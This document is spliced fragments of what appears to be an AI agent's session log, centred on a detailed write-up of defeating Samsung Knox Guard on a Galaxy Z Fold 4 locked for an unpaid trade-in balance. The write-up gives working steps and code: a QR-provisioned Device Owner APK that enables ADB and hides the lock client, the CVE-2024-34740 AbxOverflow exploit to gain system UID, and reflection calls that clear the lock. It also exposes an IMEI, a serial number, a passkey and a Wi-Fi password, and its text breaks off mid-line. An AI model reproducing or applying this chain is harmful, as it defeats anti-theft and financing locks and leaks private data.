Here's what the search results show:\n\n## Key Findings:\n\n**Ordered Broadcasts and Priority:**\nIn ordered mode, broadcasts are sent to each receiver in order (controlled by the android:priority attribute for the intent-filter element in the manifest file) and one receiver is able to abort the broadcast so that receivers with a lower priority would not receive it (thus never execute).\n\n**Aborting Broadcasts:**\nThe abortBroadcast() method sets the flag indicating that this receiver should abort the current broadcast; only works with broadcasts sent through Context.sendOrderedBroadcast. This will prevent any other broadcast receivers from receiving the broadcast.\n\n**CONNECTIVITY_CHANGE Action:**\nApps targeting Android 7.0 and higher must register the CONNECTIVITY_ACTION broadcast using registerReceiver(BroadcastReceiver, IntentFilter). Declaring a receiver in the manifest doesn't work. Additionally, the CONNECTIVITY_ACTION broadcast is delivered only to context-registered receivers.\n\n**How Ordered Broadcasts Work:**\nFor ordered broadcasts, the system processes each receiver sequentially, allowing each to consume or modify the intent before passing it to the next receiver.\n\nNote: The search results don't contain specific information about \"kgclient\" in relation to Android broadcast receivers. Normal Broadcast\n\nThe `sendBroadcast(Intent)` method sends broadcasts to all receivers in an undefined order, called a Normal Broadcast. Normal broadcasts are completely asynchronous with all receivers run in an undefined order, often at the same time, meaning receivers cannot use the result or abort APIs.\n\n### sendOrderedBroadcast() - Ordered Broadcast\n\nThe `sendOrderedBroadcast(Intent, String)` method sends broadcasts to one receiver at a time, and as each receiver executes in turn, it can propagate a result to the next receiver or completely abort the broadcast so it doesn't reach other receivers.\n\nOrder is controlled with the `android:priority` attribute of the matching intent-filter.\n\n### Aborting Broadcasts\n\nThe ability to abort a broadcast only works with broadcasts sent through `Context.sendOrderedBroadcast` and will prevent any other broadcast receivers from receiving the broadcast.\n\n## Important Note About CONNECTIVITY_CHANGE\n\nThe CONNECTIVITY_ACTION broadcast is delivered only to context-registered receivers. This is a system-level restriction that applies regardless of which broadcast method is used. Note that CONNECTIVITY_CHANGE broadcasts are sent as normal broadcasts via `sendBroadcast()`, which means they **cannot be aborted** by receivers.\n\n\nREMINDER: You MUST include the sources above in your response to the user using markdown hyperlinks."}]},"uuid":"46176d9f-4087-4e1d-97e0-5c9d9fc1e8d4","timestamp":"2026-03-20T00:26:18.310Z","sourceToolAssistantUUID":"05a98a1b-bbdb-4cb0-acd8-cf32d0969c03","userType":"external","entrypoint":"cli","cwd":"/Users/kyin/Downloads/AbxOverflow","sessionId":"afd7d744-6ded-4443-a22c-68758d54c73f","version":"2.1.79","gitBranch":"HEAD","slug":"resilient-beaming-twilight"}

OverlayFS resolves these debug scenarios with the adb disable-verity and adb remount commands, which set up backing storage for a writable file system as an upper reference, and mount the lower reference on top.\n\n**Solutions Provided:**\n\n- The toggle_mount.sh script fixes this by using dmctl to toggle partitions (e.g., system, product, vendor) to read-write, verifying changes with dmctl table comparisons.\n\n- Disabling both AVB and DM-Verity requires: adb root, adb shell avbctl disable-verification, adb disable-verity, adb reboot, adb wait-for-device, adb root, adb remount.\n\nThe search results included official Android documentation, GitHub solutions, and community forums discussing these specific Android 13 partition remounting challenges.\n\n\nREMINDER: You MUST include the sources above in your response to the user using markdown hyperlinks."}]},"uuid":"1f1e2cb4-fe14-4c9f-994f-55c451814316","timestamp":"2026-03-20T00:28:51.732Z","sourceToolAssistantUUID":"d9eff9a2-add6-4079-be76-0d7e11f3dc45","userType":"external","entrypoint":"cli","cwd":"/Users/kyin/Downloads/AbxOverflow","sessionId":"afd7d744-6ded-4443-a22c-68758d54c73f","version":"2.1.79","gitBranch":"HEAD","slug":"resilient-beaming-twilight"}

[Appendix: Full Source Code](#appendix-full-source-code)\n    25→\n    26→---\n    27→\n    28→## Device Information\n    29→\n    30→| Field | Value |\n    31→|-------|-------|\n    32→| Model | Samsung Galaxy Z Fold 4 |\n    33→| Model Number | SM-F936U1 (US unlocked) |\n    34→| Carrier | XAA |\n    35→| IMEI | 356954474735469 |\n    36→| Serial | RFCW2006DLA |\n    37→| Passkey | 23198483 |\n    38→| Firmware | F936U1UES3CWF3 |\n    39→| Android Version | 13 |\n    40→| Build Date | June 2023 |\n    41→| Security Patch Level | July 2023 |\n    42→| Bootloader | BIT 3, SECURE DOWNLOAD ENABLE |\n    43→| Chipset | Qualcomm Snapdragon 8+ Gen 1 (SM8475) |\n    44→| KG Status | LOCKED (01), FRP LOCK ON |\n    45→| KG Reason | \"balance due for failure to meet trade-in terms\" |\n    46→| WiFi | SSID: coconutWater / Password: 9093255140 |\n    47→\n    48→The phone was bought secondhand and arrived Knox Guard locked. KG activates from **cached local state** within 1-2 seconds of boot, regardless of internet connectivity. This is a critical fact that invalidates many common \"block the server\" approaches.\n    49→\n    50→---\n    51→\n    52→## Background: What is Knox Guard?\n    53→\n    54→Knox Guard (KG) is Samsung's enterprise device management lock. When active, it:\n    55→\n    56→- Displays a full-screen lock overlay that blocks all interaction\n    57→- Disables USB debugging\n    58→- Prevents access to Settings, Developer Options, and most system features\n    59→- Survives factory resets (state stored in TrustZone RPMB)\n    60→- Has a hardware OTP fuse (`ro.boot.kg.bit`) that persists permanently\n    61→- Checks integrity of its own client app (`com.samsung.android.kgclient`) on every boot\n    62→\n    63→### KG State Machine (stored in TrustZone RPMB)\n    64→\n    65→| State | Value | Meaning |\n    66→|-------|-------|---------|\n    67→| Prenormal | 0 | KG not yet activated |\n    68→| Checking | 1 | KG checking with server |\n    69→| Active | 2 | KG provisioned but not locked |\n    70→| Locked | 3 | KG actively locking device |\n    71→| Completed | 4 | KG obligations met, device released |\n    72→| Error | 5 | KG in error state |\n    73→\n    74→### Key System Properties\n    75→\n    76→- `knox.kg.state` - Human-readable KG state (set from RPMB on boot)\n    77→- `ro.boot.kg` - Boot property reflecting RPMB state (e.g., `0x3` = Locked)\n    78→- `ro.boot.kg.bit` - OTP fuse value (`01` = KG enabled, hardware fuse, cannot change)\n    79→\n    80→### Key Files on Device\n    81→\n    82→- `/system/framework/services.jar` - Contains KnoxGuardSeService and KnoxGuardNative classes (in classes3.dex)\n    83→- `/system/priv-app/KnoxGuard/KnoxGuard.apk` - The KG system service APK\n    84→- `/system/priv-app/KGClient/` or equivalent - The kgclient app (`com.samsung.android.kgclient`)\n    85→- `/data/system/packages.xml` - Package manager state (ABX format)\n    86→- `/data/system/install_sessions.xml` - PackageInstaller session state (ABX format)\n    87→- `/data/misc/adb/adb_keys` - Authorized ADB public keys\n    88→\n    89→---\n    90→\n    91→## Phase 1: Initial Recon and Dead Ends\n    92→\n    93→### Everything That Was Tried and Failed\n    94→\n    95→**Phone-side approaches (all blocked by KG overlay):**\n    96→- Samsung Knox support calls -- dead end for secondhand buyers\n    97→- Emergency dialer codes (`*#0808#`, `*#0*#`, `*#7353#`) -- blocked by emergency dialer\n    98→- Home screen race condition -- approximately 1-2 second window before KG overlay, too short\n    99→- Accessibility shortcuts (Power+Vol Up, Vol Up+Vol Down 3s) -- no response on KG screen\n   100→- USB keyboard via USB-C -- no response on KG screen\n   101→- Notification shade from Support menu -- tapping Settings redirects back to KG\n   102→- Volume buttons only work inside Support menu, not on main KG screen\n   103→- Airplane mode toggle during boot window -- KG overrides and reconnects\n   104→- Quick Share method -- needs Accessibility access\n   105→- Maintenance Mode -- requires Settings access\n   106→- Bixby/Google Assistant voice -- disabled by KG\n   107→\n   108→**macOS USB/flash approaches (all blocked by Apple's CDC driver or SIP):**\n   109→- Heimdall (original 2017) -- protocol too old, handshake fails\n   110→- Heimdall (grimler fork, built from source) -- same handshake failure\n   111→- Thor (Samsung-Loki v1.1.0 macOS) -- binary broken, looks for /dev/bus/usb (Linux path)\n   112→- Custom Python pyusb Odin implementation -- USB write times out, CDC driver claims interface\n   113→- `sudo kextunload` CDC driver -- \"kext is in use or retained\" (SIP blocks)\n   114→- Heimdall kext install -- \"package is attempting to install content to system volume\" (SIP blocks)\n   115→\n   116→**AT modem commands (limited by Samsung PACM):**\n   117→\n   118→The modem IS accessible at `/dev/tty.usbmodemRFCW2006DLA2`. Connection via:\n   119→```bash\n   120→screen /dev/tty.usbmodemRFCW2006DLA2 115200\n   121→```\n   122→\n   123→| Command | Result |\n   124→|---------|--------|\n   125→| `AT` | OK (modem alive) |\n   126→| `AT+DEVCONINFO` | Returns full device info (works) |\n   127→| `AT+SWATD=0` | Switches to DDEXE mode (works) |\n   128→| `AT+SYSSCOPE=1,0` | +SYSSCOPE:1,NORMAL (works) |\n   129→| `AT+USBDEBUG` | +USBDEBUG:1,NG_NONE (responds but doesn't enable ADB) |\n   130→| `AT+USBDEBUG=?` | EXISTS BUT BLOCKED by PACM |\n   131→| `AT+DEBUGLVC=0,5` | PROTECTED_NO_TOK (needs auth token) |\n   132→| `AT+ACTIVATE` | BLOCKED |\n   133→| 60+ other commands | All UNREGISTED or NOT_ALLOWED |\n   134→\n   135→**ADB sideload (Recovery mode):**\n   136→- ADB detects phone in sideload mode (`RFCW2006DLA sideload`)\n   137→- `adb shell` -- \"error: closed\" (no shell access)\n   138→- `adb install` -- fails\n   139→- `adb sideload APK` -- signature verification failed (needs Samsung-signed OTA)\n   140→\n   141→**VM approaches:**\n   142→- UTM/QEMU -- confirmed broken for USB passthrough on Apple Silicon (QEMU bug #2178)\n   143→- Parallels -- unverified for Samsung USB on Apple Silicon\n   144→\n   145→**Services:**\n   146→- cleanimei.com -- Z Fold 4 KG removal SOLD OUT\n   147→- samsungtool.us -- device verified in their system but requires Windows\n   148→\n   149→---\n   150→\n   151→## Phase 2: Getting ADB Access via QR Provisioning\n   152→\n   153→### The Breakthrough: Android Enterprise QR Provisioning\n   154→\n   155→KG blocks everything on the phone, but during initial setup (factory reset state), the Setup Wizard runs before KG fully activates. Android Enterprise QR provisioning can install a Device Owner app during this window.\n   156→\n   157→### Step 2.1: Build the Device Owner APK\n   158→\n   159→Built a custom Device Owner APK (`com.kyin.adbenab`) that auto-enables ADB when provisioned as Device Owner.\n   160→\n   161→**Location:** `/Users/kyin/adb_enabler/`\n   162→\n   163→**Project structure:**\n   164→```\n android:name=\"android.app.action.DEVICE_ADMIN_ENABLED\" />\n   195→                <action android:name=\"android.app.action.PROFILE_PROVISIONING_COMPLETE\" />\n   196→            </intent-filter>\n   197→        </receiver>\n   198→\n   199→        <activity\n   200→            android:name=\".ProvisioningActivity\"\n   201→            android:exported=\"true\"\n   202→            android:theme=\"@android:style/Theme.NoDisplay\">\n   203→            <intent-filter>\n   204→                <action android:name=\"android.app.action.GET_PROVISIONING_MODE\" />\n   205→                <category android:name=\"android.intent.category.DEFAULT\" />\n   206→            </intent-filter>\n   207→            <intent-filter>\n   208→                <action android:name=\"android.app.action.ADMIN_POLICY_COMPLIANCE\" />\n   209→                <category android:name=\"android.intent.category.DEFAULT\" />\n   210→            </intent-filter>\n   211→ Enables USB debugging via `dpm.setGlobalSetting(admin, Settings.Global.ADB_ENABLED, \"1\")`\n   218→2. Enables developer options via `dpm.setGlobalSetting(admin, \"development_settings_enabled\", \"1\")`\n   219→3. Hides KG client via `dpm.setApplicationHidden(admin, \"com.samsung.android.kgclient\", true)`\n   220→4. Suspends KG packages via `dpm.setPackagesSuspended(admin, kgPackages, true)`\n   221→\n   222→**ProvisioningActivity.java** -- handles Android 12+ provisioning flow:\n   223→1. `GET_PROVISIONING_MODE` intent: returns fully managed device mode (mode=1)\n   224→2. `ADMIN_POLICY_COMPLIANCE` intent: enables ADB, dev options, hides kgclient, disables `adb_secure`, disables keyguard\n   225→3. **Critical:** Pre-loads the Mac's ADB public key directly into `/data/misc/adb/adb_keys` so ADB connects without authorization prompt\n   226→\n   227→The ADB public key embedded in the APK:\n   228→```\n   229→QAAAAGtQkEK9I+Lm2BwdtfIehupqAwFYIugSIEzGmrYfBe14...kyin@Kevins-MacBook-Pro-2.local\n   230→```\n   231→\n   232→### Step 2.2: Build the APK (no Android Studio required)\n   233→\n   234→```bash\n   235→cd /Users/kyin/adb_enabler\n   236→\n   237→# Set up Android SDK paths\n   238→export ANDROID_HOME=/opt/homebrew/share/android-commandlinetools\n   239→export BUILD_TOOLS=$ANDROID_HOME/build-tools/33.0.2\n   240→export PLATFORM=$ANDROID_HOME/platforms/android-33\n   241→\n   242→# Compile resources\n   243→$BUILD_TOOLS/aapt2 compile --dir res -o compiled_res.zip\n   244→\n   245→# Link resources\n   246→$BUILD_TOOLS/aapt2 link compiled_res.zip \\\n   247→  -I $PLATFORM/android.jar \\\n   248→  --manifest AndroidManifest.xml \\\n   249→  --java gen \\\n   250→  -o intermediate.apk\n   251→\n   252→# Compile Java\n   253→mkdir -p classes\n   254→javac -source 1.8 -target 1.8 \\\n   255→  -cp $PLATFORM/android.jar \\\n   256→  -d classes \\\n   257→  src/com/kyin/adbenab/*.java gen/com/kyin/adbenab/R.java\n   258→\n   259→# Create DEX\n   260→mkdir -p dex_output\n   261→$BUILD_TOOLS/d8 classes/com/kyin/adbenab/*.class \\\n && cd ..\n   268→\n   269→# Align\n   270→$BUILD_TOOLS/zipalign -f 4 unsigned.apk aligned.apk\n   271→\n   272→# Sign (create keystore if needed)\n   273→keytool -genkey -v -keystore debug.keystore /Users/kyin/Downloads/serve_apk\n   290→python3 -m http.server 8888\n   291→```\n   292→\n   293→APK URL: `http://192.168.4.125:8888/adbenab.apk`\n   294→\n   295→### Step 2.4: Generate QR Code\n   296→\n   297→The QR code must contain a JSON provisioning payload with:\n   298→- WiFi credentials\n   299→- APK download URL\n   300→- APK checksum (SHA-256 of the APK file)\n   301→- Device owner component name\n   302→- Skip encryption flag\n   303→\n   304→```bash\n   305→# Get APK checksum\n   306→sha256sum /Users/kyin/Downloads/serve_apk/adbenab.apk\n   307→```\n   308→\n   309→Generate QR code with the provisioning JSON:\n   310→```json\n   311→{\n   312→  \"android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME\": \"com.kyin.adbenab/.AdbEnableReceiver\",\n   313→  \"android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION\": \"http://192.168.4.125:8888/adbenab.apk\",\n   314→  \"android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM\": \"<SHA256_BASE64_URL_SAFE>\",\n   315→  \"android.app.extra.PROVISIONING_WIFI_SSID\": \"coconutWater\",\n   316→  \"android.app.extra.PROVISIONING_WIFI_PASSWORD\": \"9093255140\",\n   317→  \"android.app.extra.PROVISIONING_WIFI_SECURITY_TYPE\": \"WPA\",\n   318→  \"android.app.extra.PROVISIONING_SKIP_ENCRYPTION\": true\n   319→}\n   320→```\n   321→\n   322→### Step 2.5: Provision the Phone\n   323→\n   324→1. Factory reset the phone (or have it in fresh setup state)\n   325→2. On the WiFi setup screen, tap 6 times on the screen to open the QR scanner\n   326→3. Scan the QR code\n   327→4. Phone connects to WiFi, downloads APK, installs as Device Owner\n   328→5. `AdbEnableReceiver.onProfileProvisioningComplete()` fires\n   329→6. `ProvisioningActivity` handles `ADMIN_POLICY_COMPLIANCE`\n   330→7. ADB is enabled, ADB key pre-loaded, KG client hidden/suspended\n   331→\n   332→### Step 2.6: Verify ADB\n   333→\n   334→```bash\n   335→/opt/homebrew/bin/adb devices\n   336→# Should show: RFCW2006DLA    device\n   337→\n   338→/opt/homebrew/bin/adb shell id\n   339→# uid=2000(shell) gid=2000(shell)\n   340→```\n   341→\n   342→**ADB persists through reboots** because the ADB public key was written to `/data/misc/adb/adb_keys` by the Device Owner APK.\n   343→\n   344→---\n   345→\n   346→## Phase 3: Failed KG Removal Attempts via ADB\n   347→\n   348→With ADB access, several approaches were tried to remove KG. All failed.\n   349→\n   350→### 3.1: pm disable-user on kgclient (DO NOT DO THIS)\n   351→\n   352→```bash\n   353→adb shell pm disable-user --user 0 com.samsung.android.kgclient\n   354→```\n   355→\n   356→**Result:** Triggered **error 8133** (abnormal detection). This error is a bitfield computed dynamically every boot by checking if kgclient and its 6 components are enabled. Disabling the app sets all bits, producing 8133.\n   357→\n   358→**THIS IS THE WORST THING YOU CAN DO.** It creates a visible error code on the KG lock screen that makes the situation harder to recover from. The error persists until kgclient and all 6 components are re-enabled.\n   359→\n   360→### 3.2: service call knoxguard_service (permission denied)\n   361→\n   362→```bash\n   363→adb shell service call knoxguard_service 36\n   364→# Error: does not have com.samsung.android.knoxguard.STATUS\n   365→```\n   366→\n   367→Service calls to knoxguard_service require the caller to have UID 1000 (system) or the `com.samsung.android.knoxguard.STATUS` permission. ADB shell runs as UID 2000 (shell), which has neither.\n   368→\n   369→**Important correction:** Early research incorrectly suggested TX 36 was a \"disable KG\" command. It's actually `isVpnExceptionRequired()`. TX 22 (`unlockScreen`) is the real unlock, but it still requires UID 1000 permissions.\n   370→\n   371→### 3.3: Samsung TTS/FTL Exploit Chain\n   372→\n   373→The TTS (Text-to-Speech) exploit chain requires downgrading the Samsung TTS app to a vulnerable version. This phone's July 2023 SPL prevents TTS downgrade -- the package manager rejects older TTS APKs.\n   374→\n   375→### 3.4: CVE-2024-31317 (Zygote Injection)\n   376→\n   377→This exploit targets the Zygote process to gain system-level code execution. **Failed on Samsung Android 13** -- Samsung's modifications to the Zygote launch flow prevent the injection from working.\n   378→\n   379→---\n   380→\n   381→## Phase 4: CVE-2024-34740 (AbxOverflow) Exploit\n   382→\n   383→### Overview\n   384→\n   385→CVE-2024-34740 is an Android Binary XML (ABX) integer overflow vulnerability in `BinaryXmlSerializer.attributeBytesBase64()`. When writing a byte array of exactly 65536 bytes, the length field overflows to 0 via `writeShort()`, causing the array contents to be interpreted as raw ABX tokens on the next read.\n   386→\n   387→This allows injecting arbitrary XML content into `install_sessions.xml`, which can be used to:\n   388→1. Create a PackageInstaller session with a tampered `stageDir` pointing to `/data/system`\n   389→2. Create another session with `stageDir` pointing to `/data/app/dropped_apk`\n   390→3. Use these sessions to write a new APK and patch `packages.xml` to register it as `sharedUserId=\"1000\"` (system)\n   391→4. After two system_server crashes and reboots, the dropped APK runs as UID 1000 inside system_server\n   392→\n   393→**Source:** https://github.com/michalbednarski/AbxOverflow\n   394→**CVE:** CVE-2024-34740 / A-307288067\n   395→**Patched in:** August 2024 security bulletin\n   396→**Affected:** This phone (July 2023 SPL) is vulnerable\n   397→\n   398→### Step 4.1: Build the Exploit\n   399→\n   400→**Location:** `/Users/kyin/Downloads/AbxOverflow/`\n   401→\n   402→```bash\n   403→cd /Users/kyin/Downloads/AbxOverflow\n   404→\n   405→# Set Java 17\n   406→export JAVA_HOME=/opt/homebrew/opt/openjdk@17\n   407→\n   408→# Ensure local.properties has SDK path\n   409→echo \"sdk.dir=/opt/homebrew/share/android-commandlinetools\" > local.properties\n   410→\n   411→# Gradle wrapper is configured to use Gradle 8.5\n   412→# build.gradle uses Android Gradle Plugin 8.1.0\n   413→\n   414→# Build droppedapk first (release, since it gets embedded as asset)\n   415→./gradlew :droppedapk:assembleRelease\n   416→\n   417→# Move built droppedapk into app's assets\n   418→bash utils/moveapk.sh\n   419→\n   420→# Build the main exploit app\n   421→./gradlew :app:assembleDebug\n   422→```\n   423→\n   424→**Output APK:** `app/build/outputs/apk/debug/app-debug.apk`\n   425→\n   426→### Step 4.2: Key Modifications for Samsung\n   427→\n   428→The original exploit assumes a \"userspace reboot\" after system_server crashes. Samsung does a **FULL reboot** instead, which kills the `RebootBackgroundRunner` process (even though it calls `setsid()`). This required two changes:\n   429→\n   430→**1. Mac-side orchestration:** Instead of the background runner surviving the reboot, a Mac-side script (`run_exploit.sh`) polls ADB between reboots and relaunches the app for each stage.\n   431→\n   432→**2. Stage-aware MainActivity:** Modified `app/src/main/java/com/example/abxoverflow/MainActivity.java` to accept `--ei stage N` intent extras from ADB, allowing the Mac to control which stage runs:\n   433→\n   434→```java\n   435→// Mac controls which stage via intent extra:\n   436→//   adb shell am start -n .../.MainActivity --ei stage 1\n   437→//   adb shell am start -n .../.MainActivity --ei stage 2\n   438→Intent intent = getIntent();\n   439→int stage = intent.getIntExtra(\"stage\", 0);\n   440→\n   441→if (stage > 0) {\n   442→    new Thread(() -> {\n   443→        try {\n   444→            if (stage == 1) {\n   445→                Main.stage1(MainActivity.this);\n   446→                Main.crashSystemServer();\n   447→            } else if (stage == 2) {\n   448→                Main.stage2(MainActivity.this);\n   449→                Main.crashSystemServer();\n   450→            }\n   451→        } catch (Exception e) { ... }\n   452→    }).start();\n   453→}\n   454→```\n   455→\n   456→**3. --activity-clear-task flag:** After the first reboot, the app's Thread in `onCreate()` produced ZERO logs. The fix was using `--activity-clear-task` flag when launching via `adb shell am start` to force fresh Activity creation.\n   457→\n   458→### Step 4.3: The droppedapk\n   459→\n   460→The dropped APK (`com.example.abxoverflow.droppedapk`) is the payload that gets installed as UID 1000. Key attributes in its `AndroidManifest.xml`:\n   461→\n   462→```xml\n   463→<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n   464→    android:sharedUserId=\"android.uid.system\">\n   465→    <application\n   466→        android:process=\"system\"\n   467→        ...>\n   468→```\n   469→\n   470→- `android:sharedUserId=\"android.uid.system\"` -- requests to run under UID 1000\n   471→- `android:process=\"system\"` -- requests to be loaded into the system_server process (required because SELinux has no seapp_contexts rule for `user=system seinfo=default`)\n   472→- Has a `BOOT_COMPLETED` receiver (`LaunchReceiver`) that auto-starts after reboot\n   473→\n   474→### Step 4.4: How the Exploit Works (detailed flow)\n   475→\n   476→**Stage 1 (ABX injection):**\n   477→\n   478→1. App creates a `PackageInstaller.Session` and sets a `Checksum` object with a carefully crafted 65536-byte payload\n   479→2. The payload contains raw ABX tokens that, when parsed, create two fake sessions:\n   480→   - Session A: `sessionStageDir=\"/data/system\"`, `prepared=\"true\"` (directory exists, don't create)\n   481→   - Session B: `sessionStageDir=\"/data/app/dropped_apk\"`, `prepared=\"false\"` (will be created on first use)\n   482→3. A second dummy session is created and immediately abandoned to trigger `install_sessions.xml` to be written\n   483→4. After a delay, `crashSystemServer()` is called (via a `Parcelable` chain using `IAlarmManager.set()` -> `AlarmClockInfo` -> `PackageParser$Activity` -> `PooledStringWriter` -> SIGSEGV on read-only Binder memory)\n   484→5. System reboots\n   485→\n   486→**Stage 2 (packages.xml patch + APK drop):**\n   487→\n   488→1. After reboot, Mac's `run_exploit.sh` detects ADB is back and launches stage 2\n   489→2. Using Session B (tampered `stageDir=\"/data/app/dropped_apk\"`): extracts `droppedapk-release.apk` from app assets and writes it as `base.apk`\n   490→3. Using Session A (tampered `stageDir=\"/data/system\"`): reads `packages.xml` via `openRead()`, converts from ABX to regular XML using `abx2xml`, patches it to:\n   491→   - Add a new `<package>` entry for `com.example.abxoverflow.droppedapk` with `sharedUserId=\"1000\"` and `codePath=\"/data/app/dropped_apk\"`\n   492→   - Add the droppedapk's signing certificate to the `<shared-user name=\"android.uid.system\" userId=\"1000\">` element's `<pastSigs>` (duplicated twice with `flags=\"2\"` because the last pastSig is ignored as \"current\")\n   493→   - Allocate new keyset identifiers for the certificate\n   494→4. Writes the patched XML as `packages-backup.xml` in `/data/system`\n   495→5. Crashes system_server again\n   496→\n   497→**After second reboot:**\n   498→- System sees `packages-backup.xml` exists, considers `packages.xml` corrupted, reads backup instead\n   499→- droppedapk is registered as installed with `sharedUserId=\"1000\"`\n   500→- On `BOOT_COMPLETED`, `LaunchReceiver` starts `MainActivity`, which runs inside system_server process as UID 1000\n   501→\n   502→### Step 4.5: The Orchestration Script\n   503→\n   504→**File:** `/Users/kyin/Downloads/AbxOverflow/run_exploit.sh`\n   505→\n   506→```bash\n   507→#!/bin/bash\n   508→ADB=\"/opt/homebrew/bin/adb\"\n   509→PKG=\"com.example.abxoverflow\"\n   510→DROPPED=\"com.example.abxoverflow.droppedapk\"\n   511→\n   512→# Stage 1: Launch with --ei stage 1, wait for crash + reboot\n   513→$ADB shell am start -n \"$PKG/.MainActivity\" --ei stage 1\n   514→\n   515→# Poll for ADB to come back after reboot\n   516→# (wait_adb polls every 1s for up to 180s)\n   517→# (wait_boot polls sys.boot_completed every 1s for up to 120s)\n   518→\n   519→# Stage 2: Launch with --ei stage 2\n   520→$ADB shell am force-stop \"$PKG\"\n   521→$ADB shell am start -n \"$PKG/.MainActivity\" --ei stage 2 --activity-clear-task\n   522→\n   523→# After second reboot, verify droppedapk is installed\n   524→$ADB shell pm list packages | grep droppedapk\n   525→```\n   526→\n   527→### Step 4.6: Verifying Success\n   528→\n   529→```bash\n   530→# Check if droppedapk is installed\n   531→adb shell pm list packages | grep droppedapk\n   532→# package:com.example.abxoverflow.droppedapk\n   533→\n   534→# Verify UID 1000\n   535→adb shell dumpsys package com.example.abxoverflow.droppedapk | grep userId\n   536→# userId=1000, sharedUser=SharedUserSetting{... android.uid.system/1000}\n   537→\n   538→# Launch droppedapk\n   539→adb shell am start -n com.example.abxoverflow.droppedapk/.MainActivity\n   540→```\n   541→\n   542→### Step 4.7: Rebuilding droppedapk\n   543→\n   544→A key property of this exploit: **droppedapk can be rebuilt and reinstalled with `adb install -r`** and it retains UID 1000 status. This is because the signing certificate (from the debug keystore at `/Users/kyin/Downloads/AbxOverflow/droppedapk/`) matches what was registered in `packages.xml`. As long as you sign with the same keystore, reinstalls preserve the UID.\n   545→\n   546→```bash\n   547→# Rebuild droppedapk with changes\n   548→cd /Users/kyin/Downloads/AbxOverflow\n   549→./gradlew :droppedapk:assembleDebug\n   550→\n   551→# Reinstall (preserves UID 1000)\n   552→adb install -r droppedapk/build/outputs/apk/debug/droppedapk-debug.apk\n   553→```\n   554→\n   555→---\n   556→\n   557→## Phase 5: KG Service Exploitation via UID 1000 Reflection\n   558→\n   559→With droppedapk running as UID 1000 inside system_server, we can use Java reflection to call any method on any system service without permission checks.\n   560→\n   561→### Step 5.1: Service Method Discovery (v4 build)\n   562→\n   563→The droppedapk's `MainActivity.callKnoxGuardService()` method uses reflection to:\n   564→1. Get the `knoxguard_service` binder via `ServiceManager.getService(\"knoxguard_service\")`\n   565→2. List all methods on the service class\n   566→3. Call methods directly via reflection (bypasses Binder permission checks because we're in the same process)\n   567→\n   568→**Key methods discovered on KnoxGuardSeService:**\n   569→- `setRemoteLockToLockscreen(boolean)` -- controls KG lock overlay\n   570→- `unlockCompleted()` -- marks unlock as complete\n   571→- `unbindFromLockScreen()` -- unbinds KG from the lock screen\n   572→- `unlockScreen()` -- wraps native unlock + extra logic\n   573→- `resetRPMB()` -- attempts to reset RPMB state (permission checked separately)\n   574→- `removeActiveAdmin(ComponentName)` -- removes device admin\n   575→- `lockScreen(...)` -- locks the screen\n   576→- `getTAState()` -- gets TrustZone TA state\n   577→- `setCheckingState()` -- sets checking state\n   578→\n   579→### Step 5.2: Direct Method Calls (v5 build)\n   580→\n   581→Called these methods via reflection from droppedapk:\n   582→\n   583→```java\n   584→// Get the service object (not the binder proxy -- the actual implementation in our process)\n   585→Class<?> sm = Class.forName(\"android.os.ServiceManager\");\n   586→Object kgService = sm.getMethod(\"getService\", String.class).invoke(null, \"knoxguard_service\");\n   587→\n   588→// setRemoteLockToLockscreen(false) -- clears KG lock overlay\n   589→Method m = kgService.getClass().getDeclaredMethod(\"setRemoteLockToLockscreen\", boolean.class);\n   590→m.setAccessible(true);\n   591→m.invoke(kgService, false);\n   592→// Result: OK! Lock overlay cleared\n   593→\n   594→// unlockCompleted() -- marks unlock complete\n   595→Method m2 = kgService.getClass().getDeclaredMethod(\"unlockCompleted\");\n   596→m2.setAccessible(true);\n   597→m2.invoke(kgService);\n   598→// Result: OK!\n   599→\n   600→// unbindFromLockScreen()\n   601→Method m3 = kgService.getClass().getDeclaredMethod(\"unbindFromLockScreen\");\n   602→m3.setAccessible(true);\n   603→m3.invoke(kgService);\n   604→// Result: OK!\n   605→```\n   606→\n   607→**Result:** Error 8133 was CLEARED. The regular KG lock was visible instead of the abnormal detection error. This was progress but not a permanent fix -- the lock returns after reboot because KG state lives in TrustZone RPMB.\n   608→\n   609→---\n   610→\n   611→## Phase 6: TrustZone RPMB State Manipulation\n   612→\n   613→### Step 6.1: Research Discovery\n   614→\n   615→A research agent discovered the `KnoxGuardNative` class inside `services.jar` (classes3.dex). This class provides JNI methods that talk directly to the TrustZone Trusted Application (TA) that manages KG state in RPMB:\n   616→\n   617→- `tz_getTAState(int)` -- reads current TA state from RPMB\n   618→- `tz_unlockScreen(int)` -- tells TA to unlock\n   619→- `tz_lockScreen(int)` -- tells TA to lock\n   620→- `tz_userChecking(int)` -- sets checking state\n   621→- `tz_resetRPMB(int)` or `tz_resetRPMB(int, byte[])` -- resets RPMB data\n   622→\n   623→### Step 6.2: Classloader Fix (v7 build)\n   624→\n   625→Initial attempt to load `KnoxGuardNative` via `Class.forName()` failed with `ClassNotFoundException`. The class is not in the boot classpath -- it's in `services.jar` alongside `KnoxGuardSeService`.\n   626→\n   627→**Fix:** Use the service's own classloader:\n   628→\n   629→```java\n   630→private Class<?> getKGNativeClass() throws ClassNotFoundException {\n   631→    Class<?> sm = Class.forName(\"android.os.ServiceManager\");\n   632→    Object kgService = sm.getMethod(\"getService\", String.class).invoke(null, \"knoxguard_service\");\n   633→    ClassLoader cl = kgService.getClass().getClassLoader();\n   634→    return cl.loadClass(\"com.samsung.android.knoxguard.service.KnoxGuardNative\");\n   635→}\n   636→```\n   637→\n   638→### Step 6.3: TrustZone Native Calls (v8-v9 builds)\n   639→\n   640→The native methods return `KgErrWrapper` objects, not simple integers. Used reflection to unwrap them:\n   641→\n   642→```java\n   643→private String unwrapKgErr(Object kgService, Object wrapper) {\n   644→    // Try getIntResult on the service\n   645→    Method m = kgService.getClass().getDeclaredMethod(\"getIntResult\", wrapper.getClass());\n   646→    m.setAccessible(true);\n   647→    Object intResult = m.invoke(kgService, wrapper);\n   648→    // Also dump all fields: data, err, result, KGTA_FAILED, KGTA_PARAM_DEFAULT, TAG\n   649→    for (Field f : wrapper.getClass().getDeclaredFields()) {\n   650→        f.setAccessible(true);\n   651→        // ...\n   652→    }\n   653→}\n   654→```\n   655→\n   656→**Results:**\n   657→\n   658→| Call 